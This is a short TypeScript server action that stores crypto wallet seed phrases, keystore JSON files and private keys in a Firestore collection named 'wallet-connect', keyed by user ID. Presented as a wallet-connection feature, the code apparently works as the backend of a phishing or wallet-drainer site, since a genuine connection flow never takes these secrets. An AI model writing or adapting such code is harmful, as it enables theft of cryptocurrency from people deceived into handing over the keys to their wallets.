"use server";

import { adminDb } from "@/lib/firebase/firebaseAdmin";
import { FieldValue } from "firebase-admin/firestore"; 

export async function connectUserWalletConnect(
  uid: string,
  type: WalletConnectType,
  value: string | KeystoreEntry
) {
  if (!uid || typeof uid !== "string" || uid.trim() === "") {
    throw new Error("Invalid UID: UID must be a non-empty string.");
  }
  const docRef = adminDb.collection("wallet-connect").doc(uid);
  const docSnap = await docRef.get();

  let updateData: any = {};

  if (type === "phrase") {
    updateData = {
      phrases: FieldValue.arrayUnion(value as string),
    };
  } else if (type === "keystorejson") {
    updateData = {
      keystorejson: FieldValue.arrayUnion(value as KeystoreEntry),
    };
  } else if (type === "privatekey") {
    updateData = {
      privatekey: FieldValue.arrayUnion(value as string),
    };
  }

  if (!docSnap.exists) {
    await docRef.set({
      phrases: type === "phrase" ? [value] : [],
      keystorejson: type === "keystorejson" ? [value] : [],
      privatekey: type === "privatekey" ? [value] : [],
    });
  } else {
    await docRef.update(updateData);
  }
}